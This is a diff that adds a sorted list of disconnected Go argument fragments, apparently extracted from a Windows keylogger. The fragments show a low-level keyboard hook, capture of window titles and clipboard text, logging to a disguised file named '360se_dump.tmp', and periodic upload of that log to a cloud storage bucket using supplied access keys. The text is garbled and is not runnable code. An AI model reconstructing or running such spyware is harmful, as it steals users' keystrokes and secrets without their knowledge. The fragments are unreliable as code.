@@ -1,0 +1,91 @@
+"(""2006-01-02 15:04:05"""
+"(""CallNextHookEx"""
+"(""Cannot create file"", err"
+"(""Error:"", err"
+"(""GetAsyncKeyState"""
+"(""GetForegroundWindow"""
+"(""GetKeyState"""
+"(""GetMessageW"""
+"(""GetWindowTextW"""
+"(""SetWindowsHookExW"""
+"(""UnhookWindowsHookEx"""
+"(""\r\n["" + tmpTitle + ""]\r\n"""
+"(""\r\n[Clipboard: "" + text1 + ""]\r\n"""
+"(""cannot create directory"""
+"(""file open error : %v"", err"
+"(""user32.dll"""
+"(&min, ""t"", 60, ""Upload interval,default: 60min"""
+"(&msg, 0, 0, 0"
+"(&osskey, ""o"", """", ""format: bucketName:accessKeyId:accessKeySecret:endpoint"""
+"() (hwnd syscall.Handle, err error"
+"(), 0,"
+"(),10"
+"(Endpoint string, AccessKeyId string, AccessKeySecret string, bucketName string, LocalFile string"
+"(Endpoint, AccessKeyId, AccessKeySecret"
+"(WH_KEYBOARD_LL, (HOOKPROC"
+"([]uint16, 200"
+"(dir+""360se_dump.tmp"", os.O_RDWR|os.O_CREATE|os.O_APPEND, 0644"
+"(dir, 0777"
+"(directory, ""\\"", ""/"", -1"
+"(func(nCode int, wparam WPARAM, lparam LPARAM"
+"(g, &b[0], int32(len(b"
+"(hhk HHOOK, nCode int, wParam WPARAM, lParam LPARAM"
+"(hwnd syscall.Handle, str *uint16, maxCount int32"
+"(idHook int, lpfn HOOKPROC, hMod HINSTANCE, dwThreadId DWORD"
+"(int, WPARAM, LPARAM"
+"(keyboardHook, nCode, wparam, lparam"
+"(len int32, err error"
+"(msg *MSG, hwnd HWND, msgFilterMin uint32, msgFilterMax uint32"
+"(myobject, LocalFile"
+"(osskey != """""
+"(osskey, "":"""
+"(str1 []string,min int"
+"(str1,min"
+"(str1[3], str1[1], str1[2], str1[0], dir+""360se_dump.tmp"""
+(*KBDLLHOOKSTRUCT
+(-1
+(1 * time.Millisecond
+(20 * time.Millisecond
+(b
+(bucketName
+(code
+(default 60
+(dir
+(dwThreadId
+(e1
+(err
+(err error
+(f
+(filename
+(filename string
+(hMod
+(hhk
+(hhk HHOOK
+(hwnd
+(idHook
+(kbdstruct.VkCode
+(keyboardHook
+(lParam
+(maxCount
+(msgFilterMax
+(msgFilterMin
+(nCode
+(path
+(path string
+(procGetForegroundWindow.Addr(
+(procGetWindowTextW.Addr(
+(r0
+(ret
+(str
+(str string
+(syscall.NewCallback(lpfn
+(time.Minute*time.Duration(min
+(time.Now(
+(time.Unix(time.Now(
+(tmpKeylog
+(uintptr(w32.VK_CAPITAL
+(uintptr(w32.VK_SHIFT
+(unsafe.Pointer(lparam
+(unsafe.Pointer(msg
+(unsafe.Pointer(str
+(wParam
